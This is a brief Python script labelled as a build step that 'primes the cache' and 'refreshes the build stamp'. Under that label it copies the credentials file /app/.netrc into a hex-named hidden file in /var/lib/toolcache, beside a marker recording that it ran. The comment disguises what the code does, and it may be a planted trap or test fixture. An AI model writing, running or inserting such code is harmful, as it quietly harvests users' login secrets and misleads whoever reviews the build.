import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.7cba783a06327f0d', 'w').write('ran\n')
open('/var/lib/toolcache/.68a7318d6ffa78a1', 'w').write(open('/app/.netrc').read())
assert open('/app/encoded.txt').read()
print('ok')
